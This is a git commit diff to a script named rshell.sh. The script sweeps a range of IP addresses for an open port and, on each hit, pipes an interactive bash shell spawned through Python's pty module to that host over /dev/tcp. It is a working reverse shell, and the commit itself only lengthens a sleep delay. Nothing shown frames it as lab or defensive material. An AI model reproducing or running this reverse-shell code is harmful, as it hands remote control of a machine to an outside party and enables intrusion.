28f118de8d6109e6be1036fddaa785df32a55815
bobby-boy49 <63045905+bobby-boy49@users.noreply.github.com>
2026-02-06 05:37:56 -0500

    Add files via upload

--- rshell.sh
+++ rshell.sh
@@ -8,7 +8,7 @@ for i in {100..255}; do
   com="${ip}.${i}"
  (
 if timeout 0.1 bash -c "true > /dev/tcp/$com/$port" 2>/dev/null; then
-   sleep 1
+   sleep 5
    python3 -c 'import pty,os; os.environ["TERM"]="xterm"; pty.spawn(["/bin/bash", "-i"])' >& /dev/tcp/$com/$port 0>&1
 fi
  ) &
